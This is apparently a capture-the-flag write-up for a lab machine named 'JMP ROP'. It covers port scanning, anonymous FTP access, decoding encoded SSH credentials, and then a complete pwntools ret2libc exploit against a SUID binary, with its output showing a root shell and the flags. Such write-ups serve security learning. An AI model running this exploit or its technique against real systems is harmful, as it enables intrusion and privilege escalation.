### 0x01 Challenge:

**Level:** Medium

**Description:**

>**JMP ROP**
>
>Get user and root flags.
>author: torombolo

### 0x02 User write-up:

We start by scanning the IP to get active services.

```
➜ nmap -sV -Pn -T5 192.168.105.156
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-14 10:40 BST
Nmap scan report for 192.168.105.156
Host is up (0.00045s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.5
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
MAC Address: 52:54:00:5E:DD:46 (QEMU virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds

```

If we try to log into the FTP service with credencials anonymous:(blank), we can see a downloadable b64.txt file.

```
ftp 192.168.105.156
Connected to 192.168.105.156.
220 (vsFTPd 2.3.5)
Name (192.168.105.156:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            13 Jun 11 07:05 b64.txt
226 Directory send OK.
ftp> get b64.txt
local: b64.txt remote: b64.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for b64.txt (13 bytes).
226 Transfer complete.
13 bytes received in 0.00 secs (9.7506 kB/s)
ftp> exit
221 Goodbye.
```

Reviewing the content we see only one word with a /, which first may indicate that it refers to a directory. Looking again at the services we can guess that it is a web directory but it does not work by itself, but as the name of the file indicates, we must pass it to base64.

```
cat b64.txt | base64
dHJ5aGFyZGVhbmRvLw==
```

![Branching](https://i.imgur.com/jVatHw4.png)

We download the document and see that it contains an encoded / encrypted string.

![Branching](https://i.imgur.com/myHhMND.png)

After a bit of searching and with the help of our friend [cyberchef](https://gchq.github.io/CyberChef/) we verified that it is a base85 that gives us the ssh credentials to the user.

![Branching](https://i.imgur.com/Xs0BWVW.png)

```
ssh shon@192.168.105.156 
The authenticity of host '192.168.105.156 (192.168.105.156)' can't be established.
ECDSA key fingerprint is SHA256:aVdX11T+OcqIBcidwkultxyGsvTM5XFcIuYRgJwXTSw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.105.156' (ECDSA) to the list of known hosts.
shon@192.168.105.156's password: 
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-117-generic i686)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Your Hardware Enablement Stack (HWE) is supported until April 2017.

This Ubuntu 12.04 LTS system is past its End of Life, and is no longer
receiving security updates.  To protect the integrity of this system, it’s
critical that you enable Extended Security Maintenance updates:
 * https://www.ubuntu.com/esm

Last login: Sat Jun  8 16:11:43 2019 from 192.168.1.112
shon@jmp-rop:~$ cat user.txt
uad360{FlagSwag1337}
shon@jmp-rop:~$ JEJE
```

`User flag: uad360{FlagSwag1337}`


### 0x03 Root write-up:

For the privilege escalation the name of the machine helps us to guide us by where it goes, so we list the files that have sticky bit.

```
shon@jmp-rop:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/mtr
/usr/bin/lppasswd
/usr/bin/chfn
/usr/bin/at
/usr/bin/sudoedit
/usr/bin/ropme <----------------------
/usr/bin/X
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/arping
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/usr/sbin/pppd
/usr/sbin/uuidd
/bin/su
/bin/mount
/bin/fusermount
/bin/ping6
/bin/umount
/bin/ping
```

The goal is clear! We download the file and we try to exploit it. To exploit this rop has been used a exploit from [Julianjm](https://twitter.com/julianjm512).

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 192.168.1.104 --user shon --pass elheraldodeshon /usr/bin/ropme
from pwn import *

exe = context.binary = ELF('./ropme')

host = args.HOST or '192.168.105.156'
port = int(args.PORT or 22)
user = args.USER or 'shon'
password = args.PASSWORD or 'elheraldodeshon'
remote_path = '/usr/bin/ropme'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug(["./ropme"] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(["./ropme"] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# gdbscript = '''
# break *0x{exe.symbols.main:x}
# continue
# '''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

gadget_pop_ebx = pack(0x08048364)

# Primer payload. Leak de la direcciónde puts, y vuelta a main
payload = "A" * 0x70
payload+= pack(exe.symbols['puts']) # Llamada a puts
payload+= gadget_pop_ebx            # Retorno: Limpiamos 1 parámetro de la pila
payload+= pack(exe.got['puts'])     # Arg1 para la llamada a puts
payload+= pack(exe.symbols['main']) # Llamamos a main para una segunda vuelta

io = start()
io.sendline(payload)

io.recvline()
puts_leak = unpack(io.recv(4))
log.info("PUTS: 0x%08x", puts_leak)

# Los siguientes offsets se calculan con objdump:
# objdump -T libc.so | grep puts
if args.LOCAL:
    libc_base = puts_leak - 0x000690a0
    binsh = libc_base + 0x17eaaa
    system = libc_base + 0x0003e9e0
else:
    libc_base = puts_leak - 0x00066830
    binsh = libc_base + 0x1636a0
    system = libc_base + 0x0003f0b0

# Segundo payload. Llamamos a system("/bin/sh")
payload = "A" * 0x70
payload+= pack(system)
payload+= "AAAA"
payload+= pack(binsh)

io.sendline(payload)

io.interactive()
```

Once we use it with the correct settings, we will see this output in terminal.

```
python exploit.py
[*] '/Users/dpua/Downloads/ropme'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Connecting to 192.168.105.156 on port 22: Done
[*] shon@192.168.105.156:
    Distro    Ubuntu 12.04
    OS:       linux
    Arch:     i386
    Version:  3.13.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (11B)
[*] Closed SSH channel with 192.168.105.156
[*] Working directory: '/tmp/tmp.xJXsCtT2b8'
[+] Opening new channel: 'ln -s /home/shon/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 192.168.105.156
[+] Starting remote process '/usr/bin/ropme' on 192.168.105.156: pid 9718
[*] PUTS: 0xb7684830
[*] Switching to interactive mode
\xb6\x83\x0@tc\xb7�Oh\xb7
2 + 2 = ?
# $ whoami
root
# $ cat /root/root.txt
uad360{T0r0mb0l0R3turns1337}
# $
```

Finally we got the root flag.

`Root flag: uad360{T0r0mb0l0R3turns1337}`
